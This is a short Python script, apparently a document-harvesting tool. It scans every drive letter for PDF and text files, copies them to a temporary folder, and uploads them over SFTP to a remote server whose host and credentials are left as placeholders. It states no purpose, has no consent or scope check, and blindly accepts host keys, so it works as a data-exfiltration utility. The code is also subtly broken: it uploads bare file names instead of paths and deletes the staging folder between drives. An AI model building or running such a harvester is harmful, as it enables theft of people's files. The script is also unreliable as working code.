import os
import shutil
import paramiko

def get_drives():
    """Gets a list of available drives on the system."""
    drives = []
    for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
        drive = letter + ':'
        if os.path.exists(drive):
            drives.append(drive)
    return drives

def find_files(directory, extensions):
    """Recursively finds files with specified extensions in a given directory.

    Args:
        directory (str): The root directory to search.
        extensions (list): A list of file extensions to search for.

    Returns:
        list: A list of file paths.
    """

    files = []
    for root, _, filenames in os.walk(directory):
        for filename in filenames:
            if filename.endswith(tuple(extensions)):
                files.append(os.path.join(root, filename))
    return files

def upload_files(files, remote_host, remote_user, remote_password, remote_path):
    """Uploads a list of files to a remote SFTP server.

    Args:
        files (list): A list of file paths to upload.
        remote_host (str): The hostname or IP address of the remote SFTP server.
        remote_user (str): The username for the SFTP connection.
        remote_password (str): The password for the SFTP connection.
        remote_path (str): The remote directory to upload files to.
    """

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(remote_host, username=remote_user, password=remote_password)

    sftp_client = ssh.open_sftp()
    for file in files:
        sftp_client.put(file, remote_path + '/' + os.path.basename(file))

    sftp_client.close()
    ssh.close()

def main():
    extensions = ['.pdf', '.txt']  # Add more extensions as needed
    drives = get_drives()

    temp_dir = 'temp_files'
    os.makedirs(temp_dir, exist_ok=True)

    for drive in drives:
        try:
            files = find_files(drive, extensions)
            for file in files:
                shutil.copy2(file, temp_dir)

            # Replace with your actual SFTP server credentials
            upload_files(os.listdir(temp_dir), 'your_remote_host', 'your_username', 'your_password', 'your_remote_path')

            shutil.rmtree(temp_dir)
        except OSError as e:
            print(f"Error accessing drive {drive}: {e}")

if __name__ == '__main__':
    main()